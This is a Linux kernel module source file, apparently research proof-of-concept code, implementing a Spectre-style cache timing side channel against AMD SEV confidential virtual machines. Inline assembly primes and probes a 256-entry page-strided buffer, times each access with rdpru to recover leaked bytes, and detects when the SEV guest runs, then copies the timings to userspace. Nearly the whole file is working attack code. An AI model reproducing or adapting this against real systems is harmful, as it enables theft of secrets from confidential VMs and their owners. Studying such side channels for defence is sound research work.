#include <linux/init.h>
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/set_memory.h>
#include <linux/io.h> 
#include "attack.h"

static int rr_time[NUM_SAMPLES] = {0};
static u8 indices[256] = {118, 72, 26, 108, 62, 16, 98, 52, 6, 88, 42, 124, 78, 32, 114, 68, 22, 104, 58, 12, 94, 48, 2, 84, 38, 120, 74, 28, 110, 64, 18, 100, 54, 8, 90, 44, 126, 80, 34, 116, 70, 24, 106, 60, 14, 96, 50, 4, 86, 40, 122, 76, 30, 112, 66, 20, 102, 56, 10, 92, 46, 0, 82, 36, 95, 49, 3, 85, 39, 121, 75, 29, 111, 65, 19, 101, 55, 9, 91, 45, 127, 81, 35, 117, 71, 25, 107, 61, 15, 97, 51, 5, 87, 41, 123, 77, 31, 113, 67, 21, 103, 57, 11, 93, 47, 1, 83, 37, 119, 73, 27, 109, 63, 17, 99, 53, 7, 89, 43, 125, 79, 33, 115, 69, 23, 105, 59, 13, 246, 200, 154, 236, 190, 144, 226, 180, 134, 216, 170, 252, 206, 160, 242, 196, 150, 232, 186, 140, 222, 176, 130, 212, 166, 248, 202, 156, 238, 192, 146, 228, 182, 136, 218, 172, 254, 208, 162, 244, 198, 152, 234, 188, 142, 224, 178, 132, 214, 168, 250, 204, 158, 240, 194, 148, 230, 184, 138, 220, 174, 128, 210, 164, 223, 177, 131, 213, 167, 249, 203, 157, 239, 193, 147, 229, 183, 137, 219, 173, 255, 209, 163, 245, 199, 153, 235, 189, 143, 225, 179, 133, 215, 169, 251, 205, 159, 241, 195, 149, 231, 185, 139, 221, 175, 129, 211, 165, 247, 201, 155, 237, 191, 145, 227, 181, 135, 217, 171, 253, 207, 161, 243, 197, 151, 233, 187, 141};

void rrfs_spectre(uint64_t adrs, uint64_t trigger_ptr, int *result) {
		asm volatile(
		"movq %%rcx, %%r15					\n"
		"xorq %%r12, %%r12					\n"
		"xorq %%r11, %%r11					\n"
		"xorq %%r10, %%r10					\n"
		"xorq %%r9, %%r9					\n"
		"movq $0, %%r13 					\n"

        "movq $0, %%r12      				\n"
		"loop1: 							\n"
        "movq %%r15, %%r10      			\n"
		"addq %%r12, %%r10 					\n"
		"movb (%%r10), %%r9b 				\n"
		"shlq $12, %%r9 					\n"
        "movzx (%%rbx, %%r9), %%rax     	\n"
		"lfence								\n"
		"xorq %%r10, %%r10					\n"
		"xorq %%r9, %%r9					\n"
		"incl %%r12d 						\n"
		"cmpl $256, %%r12d 					\n"
		"jne loop1 							\n"

		"mfence								\n"
		"movq $0, (%%rdi) 					\n"
		"mfence								\n"

        "movq $0, %%r12      				\n"
		"dummy_loop1:						\n"
		"incl %%r12d 						\n"
		"cmpl $303030, %%r12d 				\n"
		"jne dummy_loop1					\n"
		"lfence								\n"

		"monitor_loop%=:"

        "movq $0, %%r12      				\n"
        "movl $1, %%ecx      				\n"
		"loop2: 							\n"
		"rdpru								\n"
        "lfence     						\n"
        "movl %%eax, %%esi      			\n"
		"movb (%%r15, %%r12), %%r10b 		\n"
		"movb %%r10b, %%r9b 				\n"
		"shlq $12, %%r9 					\n"
        "movzx (%%rbx, %%r9), %%rax     	\n"
		"xorq %%r9, %%r9					\n"
        "lfence     						\n"
		"rdpru								\n"
        "subl %%esi, %%eax      			\n"
		"cmpl $300, %%eax 					\n"
		"setge %%dl 						\n"
		"xorq %%rax, %%rax 					\n"
		"test %%r10b, %%r10b 				\n"
		"cmovz %%rax, %%rdx 				\n"

		"test %%dl, %%dl 					\n"
		"cmovnz %%r10, %%r11 				\n"
		"xorq %%r10, %%r10					\n"
		
		"incl %%r12d 						\n"
		"cmpl $256, %%r12d 					\n"
		"jne loop2 							\n"

        "movq $0, %%r12      				\n"
		"dummy_loop2:						\n"
		"incl %%r12d 						\n"
		"cmpl $303030, %%r12d 				\n"
		"jne dummy_loop2					\n"
		"lfence								\n"

		"movq (%%rdi), %%r14 				\n"
		"cmpq $1, %%r14 					\n"
		"jne monitor_loop%= 				\n"

        "movq $0, %%r12      				\n"
        "movl $1, %%ecx      				\n"
		"loop3: 							\n"
		"rdpru								\n"
        "lfence     						\n"
        "movl %%eax, %%esi      			\n"
		"movb (%%r15, %%r12), %%r10b 		\n"
		"movb %%r10b, %%r9b 				\n"
		"shlq $12, %%r9 					\n"
        "movzx (%%rbx, %%r9), %%rax     	\n"
		"xorq %%r9, %%r9					\n"
        "lfence     						\n"
		"rdpru								\n"
        "subl %%esi, %%eax      			\n"
		"cmpl $300, %%eax 					\n"
		"setge %%dl 						\n"

		"xorq %%rax, %%rax 					\n"
		"test %%r10b, %%r10b 				\n"
		"cmovz %%rax, %%rdx 				\n"

		"test %%dl, %%dl 					\n"
		"cmovnz %%r10, %%r11 				\n"
		"xorq %%r10, %%r10					\n"
		
		"incl %%r12d 						\n"
		"cmpl $256, %%r12d 					\n"
		"jne loop3 							\n"

        "mfence     						\n"
        "lfence     						\n"
		"xorq %%rdx, %%rdx					\n"
		"movb %%r11b, %%dl 					\n"
		: "=d"(*result) :"b"(adrs), "D"(trigger_ptr), "c"(indices)
		: "%eax", "%esi", "%r9", "%r10", "%r11", "%r12", "%r13", "%r14", "%r15", "memory"
		);
	return ;
}

u64 rrmb(char *adrs, char *trigger, int rounds){
	memset(rr_time, 0, sizeof(int) * rounds);
	char *ptr = adrs;
	int *time_ptr = rr_time;
	int count = rounds;
	int ret = 0;
    asm __volatile__ (
        "movq (%%rbx), %%rax      		\n"
		"mfence							\n"
        "movq %%rcx, %%r8      			\n"
        "movq %%rsi, %%r9      			\n"
        "movq %%rdi, %%r13      		\n"
        "movq %%rdx, %%rdi				\n"
		"movl $0x1, %%ecx 				\n"
		"movq $0, (%%rsi)				\n"

		"rrmb_loop:						\n"
        "mfence     					\n"
        "lfence     					\n"
		"rdpru							\n"
        "lfence     					\n"
        "movl %%eax, %%esi      		\n"
        "movq (%%rbx), %%r11     		\n"
        "lfence     					\n"
		"rdpru							\n"
        "subl %%esi, %%eax      		\n"
        "movl %%eax, (%%rdi)      		\n"
        "add $4, %%rdi      			\n"
        "dec %%r8     					\n"
        "jnz rrmb_loop					\n"

		"movq (%%r9), %%rax				\n"
        : "=a"(ret)
        : "b" (ptr), "d" (time_ptr), "c" (count), "S" (trigger)
        : "%r8", "%r9", "%r10", "%r11", "%r12", "%r13", "memory", "%rdi");

	// The return value indicates whether the SEV VM has executed.
	// ret == 0: not execute
	// ret == 1: execute
	return ret;
}

void samples_copy_to_user(u64 ptr, int len){
	int r;
	if((r = copy_to_user((void*)ptr, rr_time, len * sizeof(int))) < 0){
		printk("copy_to_user failed\n");
	}
}

